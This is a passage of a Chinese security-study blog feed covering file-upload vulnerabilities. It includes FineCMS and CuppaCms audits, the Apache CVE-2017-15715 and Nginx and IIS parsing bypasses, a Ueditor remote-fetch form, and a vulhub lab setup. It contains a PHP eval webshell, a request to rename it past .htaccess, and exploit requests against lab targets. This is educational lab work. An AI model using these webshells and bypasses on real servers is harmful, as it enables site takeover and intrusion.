language_">$this</span>-&gt;uid.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    @<span class="title function_ invoke__">dr_dir_delete</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="comment">// 目录不存在则创建目录（开发者编写的创建函数）</span></span><br><span class="line">    !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>) &amp;&amp; <span class="title function_ invoke__">dr_mkdirs</span>(<span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取POST参数的tx的值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;tx&#x27;</span>]) &#123;</span><br><span class="line">        <span class="comment"># file的值就是tx的值（这个除掉空格的做法等于没做）</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;tx&#x27;</span>]);</span><br><span class="line">        <span class="comment"># 获取文件后缀,结果存入$result</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, <span class="variable">$file</span>, <span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="comment"># 组合：文件路径+文件名+文件后缀</span></span><br><span class="line">            <span class="comment"># D:\phpstudy_pro\WWW\finecms_v5.0.6/uploadfile/member/3/0x0.php</span></span><br><span class="line">            <span class="comment"># $dir = D:\phpstudy_pro\WWW\finecms_v5.0.6/uploadfile + /member/ + 8 /</span></span><br><span class="line">            <span class="comment"># $this-&gt;uid = 8</span></span><br><span class="line">            <span class="comment"># $result[2] = 0x0.php</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$new_file</span> = <span class="variable">$dir</span>.<span class="string">&#x27;0x0.&#x27;</span>.<span class="variable">$result</span>[<span class="number">2</span>];</span><br><span class="line">            <span class="comment"># 写入文件内容</span></span><br><span class="line">            <span class="keyword">if</span> (!@<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$new_file</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$result</span>[<span class="number">1</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$file</span>)))) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="title function_ invoke__">dr_json</span>(<span class="number">0</span>, <span class="string">&#x27;目录权限不足或磁盘已满&#x27;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">library</span>(<span class="string">&#x27;image_lib&#x27;</span>);</span><br><span class="line">                <span class="variable">$config</span>[<span class="string">&#x27;create_thumb&#x27;</span>] = <span class="literal">TRUE</span>;</span><br><span class="line">                <span class="variable">$config</span>[<span class="string">&#x27;thumb_marker&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="variable">$config</span>[<span class="string">&#x27;maintain_ratio&#x27;</span>] = <span class="literal">FALSE</span>;</span><br><span class="line">                <span class="variable">$config</span>[<span class="string">&#x27;source_image&#x27;</span>] = <span class="variable">$new_file</span>;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="number">30</span>, <span class="number">45</span>, <span class="number">90</span>, <span class="number">180</span>) <span class="keyword">as</span> <span class="variable">$a</span>) &#123;</span><br><span class="line">                    <span class="variable">$config</span>[<span class="string">&#x27;width&#x27;</span>] = <span class="variable">$config</span>[<span class="string">&#x27;height&#x27;</span>] = <span class="variable">$a</span>;</span><br><span class="line">                    <span class="variable">$config</span>[<span class="string">&#x27;new_image&#x27;</span>] = <span class="variable">$dir</span>.<span class="variable">$a</span>.<span class="string">&#x27;x&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$result</span>[<span class="number">2</span>];</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;image_lib-&gt;<span class="title function_ invoke__">initialize</span>(<span class="variable">$config</span>);</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;image_lib-&gt;<span class="title function_ invoke__">resize</span>()) &#123;</span><br><span class="line">                        <span class="keyword">exit</span>(<span class="title function_ invoke__">dr_json</span>(<span class="number">0</span>, <span class="string">&#x27;上传错误：&#x27;</span>.<span class="variable">$this</span>-&gt;image_lib-&gt;<span class="title function_ invoke__">display_errors</span>()));</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$width</span>, <span class="variable">$height</span>, <span class="variable">$type</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$dir</span>.<span class="string">&#x27;45x45.&#x27;</span>.<span class="variable">$result</span>[<span class="number">2</span>]);</span><br><span class="line">                !<span class="variable">$type</span> &amp;&amp; <span class="keyword">exit</span>(<span class="title function_ invoke__">dr_json</span>(<span class="number">0</span>, <span class="string">&#x27;图片字符串不规范&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">exit</span>(<span class="title function_ invoke__">dr_json</span>(<span class="number">0</span>, <span class="string">&#x27;图片字符串不规范&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="title function_ invoke__">dr_json</span>(<span class="number">0</span>, <span class="string">&#x27;图片不存在&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上传图片到服务器</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;UCSSO_API&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$rt</span> = <span class="title function_ invoke__">ucsso_avatar</span>(<span class="variable">$this</span>-&gt;uid, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$dir</span>.<span class="string">&#x27;90x90.jpg&#x27;</span>));</span><br><span class="line">        !<span class="variable">$rt</span>[<span class="string">&#x27;code&#x27;</span>] &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_json</span>(<span class="number">0</span>, <span class="title function_ invoke__">fc_lang</span>(<span class="string">&#x27;通信失败：%s&#x27;</span>, <span class="variable">$rt</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开后门地址：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ip地址/uploadfile/member/<span class="number">3</span>/<span class="number">0x0</span>.php</span><br></pre></td></tr></table></figure><h2 id="白盒审计-CuppaCms-中间件-htaccess"><a href="#白盒审计-CuppaCms-中间件-htaccess" class="headerlink" title="白盒审计-CuppaCms-中间件-.htaccess"></a>白盒审计-CuppaCms-中间件-.htaccess</h2><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>得出的结论：</p><blockquote><p>上传文件时，文件名字自动更改。<br>上传文件时，无法通过改文件名后缀为php来上传后门。</p></blockquote><p>黑盒思路：存在文件管理上传改名突破，访问后在突破<br>审计流程：功能点-代码文件-代码块-抓包调试-验证测试</p><p>禁止PHP解析的原因：<br>    1. 目录设置解析权限 =&gt; 跳出限制的目录<br>    2. .htaccess（Apache特有）拒绝php =&gt; 删除/覆盖该文件，跳跃目录</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这道题的突破口在于改名字！</span></span><br><span class="line">大致解题过程是这样子的：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.上传后门图片：</span><br><span class="line">    写一个php后门，将php后门格式改为png</span><br><span class="line">    <span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.修改文件名：</span><br><span class="line">    这里要修改的文件名有两个：后门文件的文件名和.htaccess</span><br><span class="line">    它的内容如下：（目录权限控制）</span><br><span class="line">        <span class="comment"># Deny the excecution of files with this extensions, recommended put this file in the upload folder</span></span><br><span class="line">        &lt;FilesMatch <span class="string">&quot;\.(?:inc|php|php5|php4|php3|php2|phtml|py|rb|pl|jsp|asp|htm|shtml|html|exe)$&quot;</span>&gt;</span><br><span class="line">            Order allow,deny</span><br><span class="line">            Deny <span class="keyword">from</span> all</span><br><span class="line">        &lt;/FilesMatch&gt;</span><br><span class="line">    把htaccess改为别的什么名字随意，改完它就失效了(这是一种思路，另外一种是把文件上传到其他目录)</span><br><span class="line">    改后门文件时，必须抓包，抓包关键内容如下：</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;from&quot;</span>:<span class="string">&quot;//practice_1687786538.jpg&quot;</span>, <span class="comment"># 这个是原始的文件名</span></span><br><span class="line">            <span class="string">&quot;to&quot;</span>:<span class="string">&quot;//prdphp.php&quot;</span>,              <span class="comment"># 方法1：这个就是要修改的文件名，把它改回去php，使后门生效，并且从链接当中访问即可</span></span><br><span class="line">                                              <span class="comment"># 方法2：把文件通过../的方式改到别的目录去，并且换掉文件后缀即可。(这里以方法1为主)</span></span><br><span class="line">            <span class="string">&quot;action&quot;</span>:<span class="string">&quot;rename&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    改完放出去，目录出现这个php文件名就是完成修改了。</span><br><span class="line">    这是php文件的链接：</span><br><span class="line">        http:<span class="comment">//127.0.0.1:8033/media/prdphp.php</span></span><br><span class="line">    访问的时候，post传参x=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    如果成功，则代表突破成功了！（实验是成功了）</span><br></pre></td></tr></table></figure><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$allowed_extensions</span> = <span class="string">&quot;*.gif; *.jpg; *.jpeg; *.pdf; *.ico; *.png; *.svg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 白名单过滤</span></span><br><span class="line"><span class="variable">$allowed_extensions</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;*.&quot;</span>, <span class="string">&quot; &quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="variable">$cuppa</span>-&gt;configuration-&gt;allowed_extensions);</span><br><span class="line"><span class="variable">$allowed_extensions</span> = <span class="title function_ invoke__">array_filter</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;;&quot;</span>,<span class="variable">$allowed_extensions</span>));</span><br><span class="line"><span class="variable">$allowed_extensions</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$allowed_extensions</span>);</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;accept_file_types&#x27;</span> =&gt; <span class="string">&#x27;Filetype not allowed&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;accept_file_types&#x27;</span> =&gt; <span class="string">&#x27;/.(&#x27;</span>.<span class="variable">$allowed_extensions</span>.<span class="string">&#x27;)$/i&#x27;</span>,</span><br><span class="line"></span><br><span class="line">匹配错误就返回<span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$this</span>-&gt;options[<span class="string">&#x27;accept_file_types&#x27;</span>], <span class="variable">$file</span>-&gt;name)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;error = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_error_message</span>(<span class="string">&#x27;accept_file_types&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># administrator/js/filemanager/api/index.php</span></span><br><span class="line"><span class="comment"># html代码展示需要修改的内容(差不多是个界面的意思)</span></span><br><span class="line"><span class="comment"># php代码后台接收html传入的需要修改的内容(html修改信息传入php进行处理)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># js</span></span><br><span class="line">async <span class="title function_ invoke__">rename</span>()&#123;</span><br><span class="line">    let newFile = cuppa.<span class="title function_ invoke__">trim</span>(this.txtName.value);</span><br><span class="line">    <span class="keyword">if</span>(!newFile) <span class="keyword">return</span>;</span><br><span class="line">    newFile = cuppa.<span class="title function_ invoke__">getData</span>(PATH_CU_FM).path + <span class="string">&quot;/&quot;</span> + newFile</span><br><span class="line">    <span class="keyword">if</span>(this.data.ext) newFile += <span class="string">&quot;.&quot;</span>+this.data.ext;</span><br><span class="line">    let oldName = cuppa.<span class="title function_ invoke__">getData</span>(PATH_CU_FM).path + <span class="string">&quot;/&quot;</span> + this.data.file;</span><br><span class="line"></span><br><span class="line">    let data = &#123;<span class="string">&quot;from&quot;</span>:oldName,<span class="string">&quot;to&quot;</span>:newFile&#125;;</span><br><span class="line">    await fileManager.<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;rename&quot;</span>, data);</span><br><span class="line">    this.<span class="title function_ invoke__">close</span>();</span><br><span class="line">    fileManager.<span class="title function_ invoke__">reload</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$json</span>-&gt;action == <span class="string">&quot;rename&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$from</span> = CU_FM_ROOT_FOLDER.<span class="string">&quot;/&quot;</span>.<span class="variable">$json</span>-&gt;<span class="keyword">from</span>;</span><br><span class="line">    <span class="variable">$to</span> = CU_FM_ROOT_FOLDER.<span class="string">&quot;/&quot;</span>.<span class="variable">$json</span>-&gt;to;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$fileManager</span>-&gt;<span class="title function_ invoke__">rename</span>(<span class="variable">$from</span>, <span class="variable">$to</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 改文件名的地方</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$json</span>-&gt;action == <span class="string">&quot;copyFile&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$from</span> = CU_FM_ROOT_FOLDER.<span class="string">&quot;/&quot;</span>.<span class="variable">$json</span>-&gt;<span class="keyword">from</span>;</span><br><span class="line">    <span class="variable">$to</span> = CU_FM_ROOT_FOLDER.<span class="string">&quot;/&quot;</span>.<span class="variable">$json</span>-&gt;to;</span><br><span class="line">    <span class="comment">// 如果这里的代码只把接收的数据进行文件命名，后缀固定，那么这里是无漏洞的</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$fileManager</span>-&gt;<span class="title function_ invoke__">copyFile</span>(<span class="variable">$from</span>, <span class="variable">$to</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$json</span>-&gt;action == <span class="string">&quot;copyFolder&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$from</span> = CU_FM_ROOT_FOLDER.<span class="string">&quot;/&quot;</span>.<span class="variable">$json</span>-&gt;<span class="keyword">from</span>;</span><br><span class="line">    <span class="variable">$to</span> = CU_FM_ROOT_FOLDER.<span class="string">&quot;/&quot;</span>.<span class="variable">$json</span>-&gt;to;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$fileManager</span>-&gt;<span class="title function_ invoke__">copyFolder</span>(<span class="variable">$from</span>, <span class="variable">$to</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="白盒审计-Metinfo-编辑器引用-第三方安全"><a href="#白盒审计-Metinfo-编辑器引用-第三方安全" class="headerlink" title="白盒审计-Metinfo-编辑器引用-第三方安全"></a>白盒审计-Metinfo-编辑器引用-第三方安全</h2><p>黑盒思路：探针目录利用编辑器漏洞验证测试<br>审计流程：目录结构-引用编辑器-编辑器安全查询-EXP利用验证</p><h2 id="文件上传："><a href="#文件上传：" class="headerlink" title="文件上传："></a>文件上传：</h2><p>黑盒：寻找一切存在文件上传的功能应用<br>1、个人用户中心是否存在文件上传功能<br>2、后台管理系统是佛存在文件上传功能<br>3、字典目录扫描探针文件上传构造地址<br>4、字典目录扫描探针编辑器目录构造地址</p><p>白盒：看三点，中间件，编辑器，功能代码<br>1、中间件直接看语言环境常见搭配<br>2、编辑器直接看目录机构或搜索关键字<br>3、功能代码直接看源码应用或搜索关键字</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-超快速搭建LAMP环境+vulhub-master靶场</title>
      <link href="/2023/06/25/SEC-tool-0004/"/>
      <url>/2023/06/25/SEC-tool-0004/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题外话<br>说实在，这次确实是个意外……<br>原本环境能在本地运行，但出现了一个意想不到的意外：<br>靶场搭建完成后访问靶场时，靶场出现了访问页面错误的问题，也就是和原本预期的页面不一样。<br>花费了大把时间意识到问题后，转到了线上搭建，简述下流程。</p></blockquote><h1 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h1><p>为了方便搭建，这里采用阿里云的云ECS搭建。<br>搭建基础环境选择Docker，剩下的搭建简单归结如下：<br><strong>记住!选择按量付费，用完就释放了，别浪费钱！(排除你特别有钱的情况……)</strong></p><h2 id="基础开发环境"><a href="#基础开发环境" class="headerlink" title="基础开发环境"></a>基础开发环境</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 调用这个安装一个快捷安装包</span></span><br><span class="line">wget -O f8x https:<span class="comment">//raw.githubusercontent.com/ffffffff0x/f8x/main/f8x</span></span><br><span class="line"><span class="comment"># 用法贴下面了：</span></span><br><span class="line">批量化安装</span><br><span class="line"></span><br><span class="line">使用 -b 选项安装基本环境 (gcc、make、git、vim、telnet、jq、unzip 等基本工具)</span><br><span class="line">使用 -p 选项安装代理环境 (警告:国外云服务器上不要用,会降速)</span><br><span class="line">使用 -d 选项安装开发环境 (python3、pip3、Go、Docker、Docker-Compose、SDKMAN)</span><br><span class="line">使用 -k 选项安装渗透环境 (hashcat、ffuf、OneForAll、ksubdomain、impacket 等渗透工具)</span><br><span class="line">-ka 信息收集、扫描、爆破、抓取</span><br><span class="line">-kb 漏洞利用</span><br><span class="line">-kc 后渗透、C2</span><br><span class="line">-kd 其他</span><br><span class="line">-ke 功能重叠或长期不维护</span><br><span class="line">使用 -s 选项安装蓝队环境 (Fail2Ban、chkrootkit、rkhunter、河马webshell查杀工具)</span><br><span class="line">使用 -f 选项安装其他工具 (Bash_Insulter、vlmcsd、AdguardTeam、trash-cli 等辅助工具)</span><br><span class="line">使用 -cloud 选项安装云应用 (Terraform、Serverless Framework、wrangler)</span><br><span class="line">使用 -all 选项全自动化部署 (默认不走代理,兼容 CentOS7/<span class="number">8</span>,Debain10/<span class="number">9</span>,Ubuntu20/<span class="number">18</span>,Fedora33)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里采用安装命令如下：</span></span><br><span class="line">bash f8x -b</span><br><span class="line">bash f8x -d</span><br><span class="line"><span class="comment"># 如果本身没安装docker，可以这样：</span></span><br><span class="line">bash f8x -docker</span><br></pre></td></tr></table></figure><h2 id="LAMP迅速搭建大法"><a href="#LAMP迅速搭建大法" class="headerlink" title="LAMP迅速搭建大法"></a>LAMP迅速搭建大法</h2><p>这里采用脚本搭建</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">wget https:<span class="comment">//raw.githubusercontent.com/suifengpiaoyang/lamp_script/master/lamp.py &amp;&amp; chmod +x *.py </span></span><br><span class="line"><span class="comment"># 执行程序，选择性安装：</span></span><br><span class="line">./lamp.py</span><br><span class="line"><span class="comment"># 打开这个脚本能发现一些选项，自己选择性安装即可。</span></span><br><span class="line">**************************</span><br><span class="line"></span><br><span class="line">    建站辅助脚本(centos7)</span><br><span class="line"></span><br><span class="line">**************************</span><br><span class="line"></span><br><span class="line">    <span class="number">1</span>. 一键搭建 LAMP 环境</span><br><span class="line">        (Apache,MySQL5.<span class="number">7</span>,PHP7.<span class="number">1</span>,phpMyAdmin)</span><br><span class="line">    <span class="number">2</span>. Apache 配置</span><br><span class="line">    <span class="number">3</span>. MySQL  配置</span><br><span class="line">    <span class="number">4</span>. PHP    配置</span><br><span class="line">    <span class="number">5</span>. phpmyadmin 配置</span><br><span class="line">    <span class="number">6</span>. 端口   设置</span><br><span class="line">    <span class="number">7</span>. Apache 挂载 php</span><br><span class="line">    <span class="number">8</span>. 显示部分重要信息</span><br><span class="line">    <span class="number">9</span>. 关闭使用密码登录</span><br><span class="line">    <span class="number">0</span>. 退出程序</span><br><span class="line">            </span><br><span class="line">请选择：</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里就不图文并茂了，没必要。毕竟操作很简单。</span></span><br></pre></td></tr></table></figure><p>自此，使用vulhub就很简单了，直接开直接用。</p><h1 id="搭建vulhub大法"><a href="#搭建vulhub大法" class="headerlink" title="搭建vulhub大法"></a>搭建vulhub大法</h1><p><span style='color:red;font-weight:800;'>注意：</span>这一切的前提是完成前面的配置。</p><p>环境如果不在阿里云上面，可能还需要自己手动的配置wget，yum等.<br>并且还有一个坏处，就是涉及到外网的操作都会异常的中断。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">wget https:<span class="comment">//github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span></span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line">cd vulhub-master</span><br><span class="line"><span class="comment"># 如果用到里面的靶场，记得多看看README.md</span></span><br><span class="line"><span class="comment"># 每个靶场内的这个文件都有对应的说明</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
            <tag> 靶场 </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0024-WEB攻防-15-通用漏洞之文件上传&amp;二次渲染&amp;.htaccess&amp;变异免杀</title>
      <link href="/2023/06/25/SEC-Study-0052/"/>
      <url>/2023/06/25/SEC-Study-0052/</url>
      
        <content type="html"><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>1、中间件安全问题<br>2、中间件文件上传解析<br>3、Web应用编辑器上传</p><h2 id="详细点："><a href="#详细点：" class="headerlink" title="详细点："></a>详细点：</h2><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渲染等<br>3、检测后缀：黑名单，白名单，MIME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等</p><h2 id="本章课程内容："><a href="#本章课程内容：" class="headerlink" title="本章课程内容："></a>本章课程内容：</h2><p>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p><h2 id="前置："><a href="#前置：" class="headerlink" title="前置："></a>前置：</h2><p>后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)<br>如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门<br>如果要图片后缀解析脚本代码，一般会利用包含漏洞或解析漏洞，还有.user.ini&amp;.htaccess</p><p>中间件选用–朝java过渡，IIS即将被弃用</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="中间件文件解析-IIS-amp-Apache-amp-Nginx"><a href="#中间件文件解析-IIS-amp-Apache-amp-Nginx" class="headerlink" title="中间件文件解析-IIS&amp;Apache&amp;Nginx"></a>中间件文件解析-IIS&amp;Apache&amp;Nginx</h2><ul><li><p>IIS 6 7 文件名 目录名</p><ul><li>文件名/目录名解析漏洞<ul><li>文件名：x.asp;.x.jpg      x.asp;.x.jpg一整个都是文件名，但文件会被作为asp文件进行执行。</li><li>目录名：x.asp/x.jpg       x.asp是目录名，x.jpg是文件名。x.jpg会被作为asp来执行</li><li>IIS7.X与Nginx解析漏洞一致</li></ul></li><li>当上传的文件名固定，以及目录也无法创建时，此解析漏洞作废</li><li>命名方式：<ul><li>基于本地名命名</li><li>基于时间命名</li><li>基于随机字符命名</li></ul></li></ul></li><li><p>Apache 换行解析 配置不当</p><ul><li><p>apache可以不用安装，因为生成环境的时候它是会自带的</p></li><li><p>换行解析-CVE-2017-15715</p><ul><li>黑名单后缀禁止上传(php,asp,js),白名单仅仅允许某些符合规则的后缀上传(世事无绝对，看情况绕过黑白名单)。</li><li>通过上传php%0a的后缀突破php黑名单</li><li>其2.4.0~2.4.29版本中存在一个解析漏洞</li><li>涉及的<a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">靶场解析</a>以及对应的数据包片段如下：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;evil.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">-----------------------------<span class="number">15976337054444893102212276887</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;name&quot;</span></span><br><span class="line"></span><br><span class="line">evil.php &lt;=此处留个空格，在十六进制当中替换为<span class="number">0</span>a</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">15976337054444893102212276887</span>--</span><br></pre></td></tr></table></figure></li><li><p>配置不当-.htaccess配置不当</p><ul><li>配置不当导致带.php的所有文件被当做php文件来执行。<ul><li>AddHandler application/x-httpd-php .php</li><li>访问IP地址后，上传文件，文件会带有一个地址展示给你看，访问这个文件地址，就是带着.php.png后缀的php执行结果。</li><li>基于本地文件上传</li></ul></li></ul></li></ul></li><li><p>Nginx  文件名逻辑 解析漏洞</p><ul><li>文件名逻辑-CVE-2013-4547<ul><li>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</li><li>上传一张图片即可拿下权限：url/image.php.png =&gt; 直接将图片作为php执行。</li></ul></li><li>文件名解析漏洞-nginx.conf配置不当<ul><li>上传一张图片即可拿下权限：url/image.png/.php =&gt; 直接将图片作为php执行。</li><li>fofa对应的搜索语句：title=”phpStudy 探针 2014” &amp;&amp; server=”Nginx”</li><li>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</li></ul></li></ul></li></ul><h2 id="Web应用编辑器-Ueditor文件上传安全"><a href="#Web应用编辑器-Ueditor文件上传安全" class="headerlink" title="Web应用编辑器-Ueditor文件上传安全"></a>Web应用编辑器-Ueditor文件上传安全</h2><p>这个原本是百度开发的一个编译器。通过这个插件可以上传自己的后门，远程包含自己服务器的后门图片，用来作为后门入侵对方网站。</p><p>前后台如果存在该类编辑器，就有可能利用该编译器漏洞进行攻击。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://192.168.46.139/net/controller.ashx?action=catchimage&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">  &lt;p&gt;shell addr: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;source[]&quot;</span> /&gt;&lt;/p&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt; </span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>编辑器：Ueditor，fckeditor，ewebeditor，kindeditor等</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0023-WEB攻防-14-通用漏洞之文件上传&amp;二次渲染&amp;.htaccess&amp;变异免杀</title>
      <link href="/2023/06/22/SEC-Study-0051/"/>
      <url>/2023/06/22/SEC-Study-0051/</url>
      
